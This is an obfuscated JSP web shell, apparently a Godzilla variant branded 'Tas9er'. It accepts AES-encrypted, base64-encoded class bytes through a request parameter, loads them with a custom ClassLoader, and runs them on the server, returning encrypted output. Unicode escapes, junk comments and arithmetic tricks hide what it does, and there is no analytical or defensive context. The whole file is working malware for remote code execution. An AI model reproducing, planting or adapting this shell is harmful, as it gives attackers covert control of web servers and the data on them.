Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_csyTPcRj6STh = "791b539a74436cc0";
    String govsb_MBfH = "Tas9er";
    class govsb_zD1WEKQx extends /*edusb_N3GDloX559fYzfa*/ClassLoader {
        public govsb_zD1WEKQx(ClassLoader govsb_qPIfx2SDVN) {
            super/*edusb_63nl4zQ*/(govsb_qPIfx2SDVN);
        }
        public Class govsb_e27pqEhKKd9(byte[] govsb_8ivOlBO2W) {
            return super./*edusb_Fm*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_BDy6*/(govsb_8ivOlBO2W, 585280-585280, govsb_8ivOlBO2W.length);
        }
    }
    public byte[] govsb_xIIuNgiEUy(byte[] govsb_H, boolean govsb_uyuUWZa35kSQSc) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_44S6CbvqK3KTcL*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_DQm1Xb3qJSWL1Da = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_Iyw7BWsw9DIKU2W*/("AES");
            govsb_DQm1Xb3qJSWL1Da.init(govsb_uyuUWZa35kSQSc?585280/585280:585280/585280+585280/585280,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_EzY*/SecretKeySpec/*edusb_dtY*/(govsb_csyTPcRj6STh.getBytes(), "AES"));
            return govsb_DQm1Xb3qJSWL1Da.doFinal/*edusb_XJzSNKc6KYLHVk*/(govsb_H);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_sfqayWHQLZM3M9k = java.util.Base64./*edusb_RefwxQA5knMv5z*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_6OolrUUSe*/decode(request.getParameter(govsb_MBfH));
        govsb_sfqayWHQLZM3M9k = govsb_xIIuNgiEUy(govsb_sfqayWHQLZM3M9k,false);
        if (session.getAttribute/*edusb_ia8EC9gIpT*/("payload") == null) {
            session.setAttribute("payload", new govsb_zD1WEKQx(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_noW1jOj*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_2K1aXEIguJQw*/.govsb_e27pqEhKKd9(govsb_sfqayWHQLZM3M9k));
        } else {
            request.setAttribute("parameters", govsb_sfqayWHQLZM3M9k);
            java.io.ByteArrayOutputStream govsb_nf4s8l8X1aXpd = new java.io./*edusb_4Re3jbLEr4E6DJ*/ByteArrayOutputStream();
            Object govsb_q51Idau90s2E = /*edusb_D9P*/((Class) session.getAttribute("payload"))./*edusb_djUX9ZIF3PfvEkv*//*edusb_mGOoh2raSni6s6*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_u3kOM*/;
            govsb_q51Idau90s2E.equals(govsb_nf4s8l8X1aXpd);
            govsb_q51Idau90s2E.equals(pageContext);
            response.getWriter().write("0346F96ED2E84A4AB14BF01A337AFEFE".substring(585280-585280, 16));
            govsb_q51Idau90s2E.toString();
            response.getWriter().write(java.util.Base64/*edusb_ECviym*/.getEncoder()/*edusb_simBrIkNFCK9s*/.encodeToString(govsb_xIIuNgiEUy(govsb_nf4s8l8X1aXpd.toByteArray(),true)));
            response.getWriter().write("0346F96ED2E84A4AB14BF01A337AFEFE".substring(16));
        }
    } catch (Exception e) {
    }
%>